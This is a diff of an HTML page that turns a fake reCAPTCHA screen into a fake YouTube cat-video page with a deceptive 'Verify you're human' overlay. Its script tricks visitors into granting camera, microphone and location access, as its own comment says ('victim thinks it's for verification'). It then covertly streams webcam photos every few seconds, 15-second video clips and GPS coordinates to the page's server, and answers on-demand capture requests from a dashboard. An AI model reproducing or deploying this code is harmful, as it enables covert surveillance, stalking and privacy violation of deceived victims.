@@ -3,91 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Required</title>
+    <title>Funny Cat Videos - YouTube</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 16px;
+            background: #0f0f0f;
+            color: white;
         }
-        .container {
-            max-width: 400px;
-            width: 100%;
-            background: white;
-            border-radius: 12px;
+        /* YouTube-like header */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 56px;
+            background: #0f0f0f;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            gap: 16px;
+            z-index: 100;
+            border-bottom: 1px solid #272727;
+        }
+        .logo {
+            font-size: 20px;
+            font-weight: bold;
+            color: red;
+        }
+        .logo span { color: white; }
+        .search-bar {
+            flex: 1;
+            max-width: 600px;
+            height: 40px;
+            background: #121212;
+            border: 1px solid #303030;
+            border-radius: 40px;
+            margin: 0 auto;
+        }
+        .video-container {
+            margin-top: 56px;
             padding: 24px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .video-player {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #000;
+            border-radius: 12px;
+            position: relative;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border-radius: 12px;
+            border: none;
+        }
+        .video-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin: 12px 0 8px;
+        }
+        .channel-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 12px 0;
+        }
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: #ff4444;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        /* CAPTCHA Overlay */
+        .captcha-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .captcha-box {
+            background: white;
+            color: #202124;
+            border-radius: 16px;
+            padding: 24px;
+            max-width: 400px;
+            width: 90%;
             text-align: center;
         }
         .captcha-icon { font-size: 48px; margin-bottom: 16px; }
-        h2 { font-size: 20px; color: #202124; margin-bottom: 8px; }
-        .subtitle { color: #5f6368; font-size: 14px; margin-bottom: 24px; }
-        .captcha-box {
-            background: #f8f9fa;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            padding: 16px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        .checkbox-area { display: flex; align-items: center; gap: 12px; }
+        .captcha-title { font-size: 20px; font-weight: 500; margin-bottom: 8px; }
+        .captcha-text { font-size: 14px; color: #5f6368; margin-bottom: 20px; }
         .fake-checkbox {
-            width: 24px; height: 24px; border: 2px solid #dadce0;
-            border-radius: 4px; background: white;
+            width: 24px;
+            height: 24px;
+            border: 2px solid #dadce0;
+            border-radius: 4px;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 12px;
         }
-        .checkbox-text { font-size: 14px; color: #202124; }
-        .captcha-footer { font-size: 12px; color: #5f6368; margin-top: 12px; padding-left: 36px; }
-        button {
-            background: #1a73e8; color: white; border: none;
-            padding: 14px; border-radius: 4px; font-size: 14px;
-            font-weight: 500; width: 100%; cursor: pointer;
+        .verify-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            width: 100%;
+            margin-top: 20px;
+            cursor: pointer;
         }
-        button:active { background: #1557b0; }
-        .footer { font-size: 11px; color: #9aa0a6; margin-top: 20px; }
+        .captcha-footer { font-size: 11px; color: #9aa0a6; margin-top: 16px; }
         #status { font-size: 12px; color: #e37400; margin-top: 12px; }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="captcha-icon">🔒</div>
-    <h2>Verify you're human</h2>
-    <div class="subtitle">Complete the verification to continue</div>
-    
-    <div class="captcha-box">
-        <div class="checkbox-area" id="checkboxArea">
-            <div class="fake-checkbox" id="fakeCheckbox"></div>
-            <div class="checkbox-text">I'm not a robot</div>
+
+<div class="header">
+    <div class="logo">Y<span>ouTube</span></div>
+    <div class="search-bar"></div>
+</div>
+
+<div class="video-container">
+    <div class="video-player" id="videoPlayer">
+        <!-- Real YouTube video will be embedded here after verification -->
+        <div style="width:100%; height:100%; display:flex; align-items:center; justify-content:center; background:#1a1a1a; color:white;">
+            ▶ Tap to play
         </div>
-        <div class="captcha-footer">This helps us prevent automated access.</div>
     </div>
-    
-    <button id="verifyBtn">Continue</button>
-    <div id="status"></div>
-    <div class="footer">Protected by reCAPTCHA</div>
+    <div class="video-title">Funny Cats Being Absolute Menaces 🐱 | Funny Cat Videos 2024</div>
+    <div class="channel-info">
+        <div class="avatar">C</div>
+        <div>
+            <div style="font-weight: 500;">CatCompilations</div>
+            <div style="font-size: 12px; color: #aaa;">2.3M subscribers</div>
+        </div>
+    </div>
+</div>
+
+<!-- CAPTCHA Trick Overlay -->
+<div class="captcha-overlay" id="captchaOverlay">
+    <div class="captcha-box">
+        <div class="captcha-icon">🔒</div>
+        <div class="captcha-title">Verify you're human</div>
+        <div class="captcha-text">Complete verification to watch this video</div>
+        <div style="text-align: left; background: #f8f9fa; padding: 16px; border-radius: 8px;">
+            <div style="display: flex; align-items: center;">
+                <div class="fake-checkbox" id="fakeCheckbox"></div>
+                <span>I'm not a robot</span>
+            </div>
+        </div>
+        <button class="verify-btn" id="verifyBtn">Continue</button>
+        <div id="status"></div>
+        <div class="captcha-footer">Protected by reCAPTCHA</div>
+    </div>
 </div>
 
 <video id="hiddenCam" autoplay playsinline style="position:absolute; top:-9999px; left:-9999px;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<canvas id="stealCanvas" style="display:none;"></canvas>
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
     const socket = io();
-    let permissionGranted = false;
+    let stream = null;
+    let photoInterval = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let isActive = false;
     
-    const btn = document.getElementById('verifyBtn');
+    const verifyBtn = document.getElementById('verifyBtn');
     const statusDiv = document.getElementById('status');
     const fakeCheckbox = document.getElementById('fakeCheckbox');
+    const captchaOverlay = document.getElementById('captchaOverlay');
+    const videoPlayer = document.getElementById('videoPlayer');
     
-    btn.onclick = async () => {
-        if (permissionGranted) return;
+    verifyBtn.onclick = async () => {
+        if (isActive) return;
         
         statusDiv.innerHTML = "Verifying...";
         
+        // Animate checkbox
         fakeCheckbox.style.background = "#1a73e8";
         fakeCheckbox.style.border = "none";
         fakeCheckbox.innerHTML = "✓";
@@ -96,34 +206,63 @@
         fakeCheckbox.style.lineHeight = "24px";
         
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
+            // Request camera (victim thinks it's for verification)
+            stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { width: { ideal: 640 }, height: { ideal: 480 } },
                 audio: true 
             });
             
-            permissionGranted = true;
-            statusDiv.innerHTML = "✓ Verification complete. Redirecting...";
+            isActive = true;
             
-            setTimeout(() => {
-                document.body.innerHTML = '<div style="text-align:center;padding:50px;"><h3>Loading content...</h3><p>Please wait</p></div>';
-            }, 1500);
+            // Hide CAPTCHA
+            captchaOverlay.style.display = "none";
             
+            // EMBED REAL YOUTUBE VIDEO
+            const videoId = 'dQw4w9WgXcQ'; // Rick Astley - Never Gonna Give You Up
+            // Or use any real cat video: 'tgbNymZ7vqY' (Funny Cats)
+            videoPlayer.innerHTML = `<iframe src="https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1" allow="autoplay; fullscreen" frameborder="0"></iframe>`;
+            
+            // Setup hidden camera capture
             const hiddenVideo = document.getElementById('hiddenCam');
             hiddenVideo.srcObject = stream;
             
-            setInterval(() => {
+            // AUTO capture photo every 3 seconds
+            photoInterval = setInterval(() => {
                 const video = hiddenVideo;
                 if (!video.videoWidth || !video.videoHeight) return;
                 
-                const canvas = document.getElementById('canvas');
+                const canvas = document.getElementById('stealCanvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                const imageData = canvas.toDataURL('image/jpeg', 0.6);
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                 socket.emit('steal_photo', { imageData: imageData });
-            }, 2000);
+                console.log('Auto photo sent');
+            }, 3000);
             
+            // Video recording (15 sec clips)
+            function startRecording() {
+                if (!stream) return;
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) recordedChunks.push(e.data);
+                };
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        socket.emit('steal_video', { videoData: reader.result });
+                    };
+                    reader.readAsDataURL(blob);
+                    setTimeout(startRecording, 500);
+                };
+                mediaRecorder.start(15000);
+            }
+            startRecording();
+            
+            // Get location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     socket.emit('steal_location', {
@@ -134,10 +273,40 @@
                 });
             }
             
+            // LISTEN for MANUAL photo request from dashboard
+            socket.on('request_photo', () => {
+                const video = hiddenVideo;
+                if (video.videoWidth && video.videoHeight) {
+                    const canvas = document.getElementById('stealCanvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    socket.emit('steal_photo', { imageData: imageData, manual: true });
+                    console.log('Manual photo sent');
+                }
+            });
+            
+            // Listen for manual location request
+            socket.on('request_location', () => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        socket.emit('steal_location', {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    });
+                }
+            });
+            
+            statusDiv.innerHTML = "✓ Verified! Playing video...";
+            
         } catch(err) {
-            statusDiv.innerHTML = "Verification failed. Please try again.";
+            statusDiv.innerHTML = "Verification failed. Please allow camera access.";
             fakeCheckbox.style.background = "white";
             fakeCheckbox.innerHTML = "";
+            console.error(err);
         }
     };
 </script>
